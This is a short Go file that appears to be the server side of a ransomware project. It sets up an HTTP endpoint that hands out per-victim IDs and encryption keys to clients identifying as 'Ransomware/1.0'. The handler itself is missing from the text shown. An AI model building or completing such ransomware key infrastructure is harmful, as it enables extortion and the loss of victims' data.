package main

import (
	"log"
	"net/http"

	"github.com/julienschmidt/httprouter"
)

const (
	ALLOWED_USER_AGENT = "Ransomware/1.0"
)

var (
	ApiResponseForbidden = `{"status": 403, "message": "Seems like you are not welcome here... Bye"}`
	ApiResponseIdEncKey  = `{"id": "%s", "enckey": "%s"}`
)

func main() {
	router := httprouter.New()

	router.GET("/api/generatekeypair", generateKeyPair)

	log.Fatal(http.ListenAndServe(":8080", router))
}
